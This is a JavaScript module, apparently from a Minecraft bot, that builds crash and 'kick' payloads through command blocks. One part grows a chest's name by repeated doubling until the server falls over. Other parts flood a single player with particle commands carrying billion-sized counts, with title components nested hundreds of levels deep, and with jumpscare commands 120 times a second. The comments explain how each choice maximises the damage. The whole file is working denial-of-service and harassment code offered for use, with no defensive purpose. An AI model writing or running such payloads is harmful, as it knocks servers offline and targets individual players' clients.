'use strict';

// Shared by the two crash commands: `crashchest` builds the block, and
// `servercrash scoreboard` points a sidebar display name at it. `servercrash
// destroy` builds the same chest and then breaks it with setblock's destroy
// mode instead.
const COMMAND_LIMIT = 32000;

// A command written into a core block runs on the next tick, so a step that
// reads what the previous one wrote leaves it a tick to land. 100ms is two
// ticks: enough for the block entity to be updated, short enough that the whole
// build is a handful of them instead of the reference script's ~27 seconds.
const STEP_MS = 100;
const DEFAULT_DOUBLINGS = 6;
// Each doubling is one tick and one more copy of everything already there; past
// ten the value is already gigabytes and the server is gone well before it.
const MAX_DOUBLINGS = 10;
// The buildable world, so a typo cannot ask for a chest at 40 million.
const WORLD_LIMIT = 30000000;
const MIN_Y = -64;
const MAX_Y = 320;

// The chest's CustomName is seeded in one command, then doubled by appending it
// to itself. Every ideograph is three bytes in UTF-8, so the same command
// length carries three times the bytes an ASCII filler would: the crash packet
// reaches its 8 MiB ceiling with fewer doublings, which is fewer ticks spent
// waiting for the block entity to grow.
const SEED_LENGTH = 30000;
const BYTES_PER_CHAR = 3;
const CJK_FIRST = 0x4e00;
const CJK_LAST = 0x9fff;

// One particle command aimed at the player in `{t}`, carrying the count from
// `{n}`: `/particle ... <count> force <viewers>` is delivered to that viewer
// alone, and the count is not clamped before it reaches the packet. The helper
// clamps whatever a caller passes.
const KICK_TEMPLATE = 'execute at {t} run particle minecraft:flame ~ ~ ~ 0 0 0 0 {n} force {t}';
const KICK_DEFAULT = 2e9;

// The `kick` payload, aimed at `{t}` instead of `@a`: instead of asking the
// server for a stack of entity selectors, the title is one component nested
// hundreds of levels deep, every level filled with ideographs. A character that
// is three bytes in UTF-8 carries three times the bytes a plain ASCII filler
// does, so a single core command hands the client the most text it can, and the
// nesting makes the client walk that tree again for every line it draws. The
// packet goes to that player alone, so only their client builds it. The same
// component goes into both slots, title and subtitle, so each pair costs the
// client two of them.
const TITLE_HEAD = 'title {t} title {"text":"phantomSLAY","color":"#ffccee","extra":[';
const SUBTITLE_HEAD = 'title {t} subtitle {"text":"phantomSLAY","color":"#ffccee","extra":[';
// The innermost component: what every level of the nesting leads to.
const NESTED_LEAF = '{"text":"phantomSLAY"}';
// Ideographs per level. Three bytes each, and enough of them that the text at
// every level is worth building rather than a wrapper around nothing.
const NESTED_FILLER = 12;
// How many levels deep the component goes by default; a longer stack only
// makes the client walk further, and the count argument raises it.
const TITLE_DEFAULT = 500;

// Ten title/subtitle pairs a second while the player is still online: the client
// never finishes laying out one pair before the next is in its queue.
const TITLE_INTERVAL_MS = 100;

// The jumpscare the kick mixes in: the server's own `/jumpscare <player>`,
// aimed at the same target 120 times a second for as long as the titles run.
const JUMPSCARE_PER_SECOND = 120;
const JUMPSCARE_INTERVAL_MS = Math.round(1000 / JUMPSCARE_PER_SECOND);
const JUMPSCARE_TEMPLATE = 'jumpscare {t}';

function jumpscareCommand(name) {
    const target = String(name || '').trim();
    if (!target) return null;
    return JUMPSCARE_TEMPLATE.replaceAll('{t}', target);
}

// Four particle packets a second for the punishment payloads: enough that the
// next one is already queued when the client falls behind on the last, slow
// enough to stay inside the core's write budget.
const KICK_INTERVAL_MS = 250;

function targetedKick(name, count) {
    const target = String(name || '').trim();
    if (!target) return null;
    const requested = Number(count);
    const value = Number.isFinite(requested) && requested > 0
        ? Math.min(Math.floor(requested), KICK_DEFAULT)
        : KICK_DEFAULT;
    return KICK_TEMPLATE.replaceAll('{t}', target).replaceAll('{n}', String(value));
}

// The filler is seeded from the name it is aimed at, so kicking the same player
// twice hands the client the same component instead of a fresh random tree.
function seededSeed(length, seedText) {
    let state = 2166136261;
    const seed = String(seedText || 'vbot');
    for (let i = 0; i < seed.length; i++) state = Math.imul(state ^ seed.charCodeAt(i), 16777619);

    const span = CJK_LAST - CJK_FIRST + 1;
    let out = '';
    for (let i = 0; i < length; i++) {
        state = Math.imul(state ^ (state >>> 15), 2246822507);
        state = (state + 0x9e3779b9) | 0;
        out += String.fromCharCode(CJK_FIRST + ((state >>> 0) % span));
    }
    return out;
}

// The component every level of the title is made of: its own text, then the
// next level in `extra`. Built as one string rather than by nesting objects,
// so a command-size stack is cheap to produce.
function nestedComponent(depth, seed = 'kick') {
    const levels = Math.max(0, Math.floor(depth));
    if (!levels) return NESTED_LEAF;
    const open = `{"text":"${seededSeed(NESTED_FILLER, seed)}","extra":[`;
    return `${open.repeat(levels)}${NESTED_LEAF}${']}'.repeat(levels)}`;
}

// The `kick` title, aimed at one name: the title and its subtitle, as the two
// commands that carry them. Each level costs its own length, so the depth is
// clamped to what still fits one core command: core.run() slices at 32000
// characters, which would cut a long component into invalid JSON. Each slot is
// its own command, so each gets the whole limit.
function targetedTitle(name, count) {
    const target = String(name || '').trim();
    if (!target) return null;

    const heads = [TITLE_HEAD, SUBTITLE_HEAD].map(head => head.replaceAll('{t}', target));
    const requested = Math.floor(Number(count));
    const perLevel = `{"text":"${seededSeed(NESTED_FILLER, target)}","extra":[`.length + 2;
    // The head's own array and component are closed after the levels.
    const room = COMMAND_LIMIT - NESTED_LEAF.length - 2 - perLevel;
    const fits = Math.min(...heads.map(head => Math.floor((room - head.length) / perLevel)));
    const asked = Number.isFinite(requested) && requested > 0 ? requested : TITLE_DEFAULT;
    const value = Math.min(asked, fits);
    if (value < 1) return null;

    const component = nestedComponent(value, target);
    return heads.map(head => `${head}${component}]}`);
}

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function chineseSeed(length = SEED_LENGTH) {
    const span = CJK_LAST - CJK_FIRST + 1;
    let out = '';
    for (let i = 0; i < length; i++) {
        out += String.fromCharCode(CJK_FIRST + Math.floor(Math.random() * span));
    }
    return out;
}

// Directly above the core's own area: that chunk is loaded because the core
// works in it, and the spot is clear of the blocks the core runs commands in.
function chestPosition(bot) {
    const core = bot?.core;
    if (core?.origin && core.origin.x !== null && Number.isFinite(core.size)) {
        return { x: core.origin.x, y: core.origin.y + core.size, z: core.origin.z };
    }
    const position = bot?.position;
    if (position && Number.isFinite(position.x) && Number.isFinite(position.y) && Number.isFinite(position.z)) {
        return { x: Math.floor(position.x), y: Math.floor(position.y) + 2, z: Math.floor(position.z) };
    }
    return null;
}

// `[x y z] [doublings]` picks the spot; anything shorter than three numbers is
// just a doubling count and the spot is worked out from the core. Returns null
// when three arguments were given but they are not a place in the world.
function parseChestArgs(args) {
    const list = [...args];
    if (list.length < 3) return { position: null, rest: list };

    const coords = list.slice(0, 3).map(value => Number(value));
    const valid = coords.every(value => Number.isInteger(value)) &&
        Math.abs(coords[0]) <= WORLD_LIMIT && Math.abs(coords[2]) <= WORLD_LIMIT &&
        coords[1] >= MIN_Y && coords[1] <= MAX_Y;
    if (!valid) return null;

    return { position: { x: coords[0], y: coords[1], z: coords[2] }, rest: list.slice(3) };
}

function clampDoublings(value, fallback = DEFAULT_DOUBLINGS) {
    const requested = parseInt(value, 10);
    const doublings = Number.isFinite(requested) ? requested : fallback;
    return Math.max(0, Math.min(doublings, MAX_DOUBLINGS));
}

// Puts the chest down and grows its name. Every step waits a tick for the last
// one's block entity update, so the doublings read what they are meant to.
// Returns the character count the name reached, or an error to hand the caller.
async function buildCrashChest(ctx, position, doublings) {
    const at = `${position.x} ${position.y} ${position.z}`;

    // One command seeds the whole string: the seed is as long as a core
    // command can be, so no book, no inventory and no per-page copies.
    const merge = `data merge block ${at} {CustomName:{text:"",extra:["${chineseSeed()}"]}}`;
    if (merge.length > COMMAND_LIMIT) return { ok: false, error: 'The seed does not fit one core command.' };

    if (!ctx.run(`setblock ${at} minecraft:air`)) return { ok: false, error: 'The core could not clear the spot.' };
    await sleep(STEP_MS);

    if (!ctx.run(`setblock ${at} minecraft:chest`)) return { ok: false, error: 'The core could not place the chest.' };
    await sleep(STEP_MS);

    if (!ctx.run(merge)) return { ok: false, error: 'The core could not write the chest name.' };
    await sleep(STEP_MS);

    // Appending the component to itself doubles it; each one has to see the
    // last one's result, so they go one tick apart.
    for (let i = 0; i < doublings; i++) {
        if (!ctx.run(`data modify block ${at} CustomName.extra append from block ${at} CustomName`)) {
            return { ok: false, error: `The core stopped after ${i} doubling(s).`, at };
        }
        await sleep(STEP_MS);
    }

    // Remembered for `servercrash scoreboard` and `servercrash destroy`, which
    // then need no arguments.
    ctx.bot.crashChest = position;

    return { ok: true, at, chars: SEED_LENGTH * 2 ** doublings };
}

module.exports = {
    chineseSeed,
    nestedComponent,
    jumpscareCommand,
    JUMPSCARE_INTERVAL_MS,
    JUMPSCARE_PER_SECOND,
    chestPosition,
    parseChestArgs,
    clampDoublings,
    buildCrashChest,
    targetedKick,
    targetedTitle,
    TITLE_DEFAULT,
    TITLE_INTERVAL_MS,
    KICK_INTERVAL_MS,
    SEED_LENGTH,
    BYTES_PER_CHAR,
    COMMAND_LIMIT,
    STEP_MS,
    DEFAULT_DOUBLINGS,
    MAX_DOUBLINGS
};
